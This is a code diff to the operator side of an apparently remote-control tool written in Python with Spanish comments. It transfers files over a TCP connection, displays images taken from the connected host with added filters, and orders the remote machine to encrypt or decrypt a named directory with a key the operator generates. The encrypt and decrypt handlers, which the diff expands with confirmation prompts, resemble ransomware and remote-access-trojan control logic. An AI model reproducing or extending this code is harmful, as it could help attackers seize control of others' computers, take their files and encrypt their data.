@@ -17,7 +17,7 @@ class TCP:
         self.__host = host
         self.__port = port
 
-        if chunk <= 0 or chunk > 10:
+        if chunk <= 0 or chunk > 24:
             self.__chunk = 1024
         else:
             self.__chunk = chunk * 1024
@@ -92,12 +92,13 @@ class TCP:
         return info
 
     def enviarArchivo(self, ubicacion):
+        sleep(0.05)
         tam = os.path.getsize(ubicacion)
         paquetes = int(tam/self.__chunk)
         print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")
 
         sleep(0.1)
-        i = 1
+        i = 0
         with open(ubicacion, 'rb') as archivo:
             info = archivo.read(self.__chunk)
             while info:
@@ -111,10 +112,10 @@ class TCP:
         print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" enviado")
 
     def recibirArchivo(self, ubicacion):
-        paquetes = self.__conexion.recv(1024).decode()
+        paquetes = int(self.__conexion.recv(1024).decode())
         print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")
 
-        i = 1
+        i = 0
         with open(ubicacion, 'wb') as archivo:
             while True:
                 info = self.__conexion.recv(self.__chunk)
@@ -122,7 +123,7 @@ class TCP:
 
                 if len(info) < self.__chunk:
                     break
-                print(f"Paquete {i} recibido", end='\r')
+                print(f"Paquete {i+1} recibido", end='\r')
                 i += 1
         archivo.close()
         print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")
@@ -313,6 +314,21 @@ class TCP:
             imagen = cv2.resize(imagen, None, fx=escala, fy=escala)
             print(f"Escala: {escala}")
 
+            if re.search("-g", cmd):
+                imagen = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
+            if re.search("-n", cmd):
+                imagen = 255 - imagen
+            if re.search("-m", cmd):
+                flip = cv2.flip(imagen, 1)
+                imagen = numpy.hstack((imagen, flip))
+            if re.search("-c", cmd):
+                grises = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
+                blur = cv2.GaussianBlur(grises, (3,3), 0)
+                t1 = int(input("Threshold1: "))
+                t2 = int(input("Threshold2: "))
+                canny = cv2.Canny(image=blur, threshold1=t1, threshold2=t2)
+                imagen = cv2.cvtColor(canny, cv2.COLOR_GRAY2BGR)
+
             cv2.imshow(f"{self.__addr[0]}: {nombre}", imagen)
             cv2.waitKey()
             cv2.destroyAllWindows()
@@ -403,27 +419,45 @@ class TCP:
 
     def encrypt(self, cmd):
         clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -e", cmd)[0]
-        self.generarClave(clave)
-        key = self.cargarClave(clave)
+        directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        if clave.endswith(".key"):
+            self.generarClave(clave)
+            key = self.cargarClave(clave)
 
-        self.__conexion.send(cmd.encode())
-        sleep(0.1)
-        self.__conexion.send(key)
+            self.__conexion.send(cmd.encode())
+            self.__conexion.send(key)
 
-        msg = self.__conexion.recv(1024).decode()
+            msg = self.__conexion.recv(1024).decode()
+            if msg[:6] != "error:":
+                nombre = msg.split('-')[1]
+                print(Fore.MAGENTA + f"[?] Segur@ que quieres encriptar el directorio \"{nombre}\"?...\n[S/n] ", end='')
+                res = input()
 
-        if msg[:6] != "error:":
-            print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
+                if len(res) == 0 or res.upper() == 'S':
+                    self.__conexion.send('S'.encode())
 
-            self.recibirArchivo(f"{clave}.dat")
+                    msg = self.__conexion.recv(1024).decode()
+                    print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
+                    self.recibirArchivo(f"{clave}.dat")
+
+                else:
+                    self.__conexion.send('N'.encode())
+                    msg = self.__conexion.recv(1024).decode()
+                    print(Fore.YELLOW + f"[!] {self.__addr[0]}: {msg}")
+
+            else:
+                print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+
         else:
-            print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+            print(Fore.YELLOW + f"[!] Error al crear la clave \"{clave}\"")
 
     def decrypt(self, cmd):
         clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+        directorio = re.findall("-d([a-zA-Z0-9./ ].*)", cmd)[0]
         if os.path.isfile(clave) and clave.endswith(".key"):
-            print(Fore.MAGENTA + f"Segur@ que quieres usar la clave \"{clave}\"?...\n[S/n] ", end='')
+            print(Fore.MAGENTA + f"[?] Segur@ que quieres usar la clave \"{clave}\"?...\n[S/n] ", end='')
             res = input()
+
             if len(res) == 0 or res.upper() == 'S':
                 key = self.cargarClave(clave)
                 self.__conexion.send(cmd.encode())
@@ -432,9 +466,23 @@ class TCP:
 
                 msg = self.__conexion.recv(1024).decode()
                 if msg[:6] != "error:":
-                    print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
-                    self.recibirArchivo(f"{clave}.dat")
-                    os.remove(f"{clave}")
+                    nombre = msg.split('-')[1]
+                    print(Fore.MAGENTA + f"[?] Segur@ que quieres desencriptar el directorio \"{nombre}\"?...\n[S/n] ", end='')
+                    res = input()
+
+                    if len(res) == 0 or res.upper() == 'S':
+                        self.__conexion.send('S'.encode())
+
+                        msg = self.__conexion.recv(1024).decode()
+                        print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
+                        self.recibirArchivo(f"{clave}.dat")
+                        os.remove(f"{clave}")
+                        print(Fore.YELLOW + f"[!] Clave \"{clave}\" eliminada")
+
+                    else:
+                        self.__conexion.send('N'.encode())
+                        msg = self.__conexion.recv(1024).decode()
+                        print(Fore.YELLOW + f"[!] {self.__addr[0]}: {msg}")
 
                 else:
                     print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
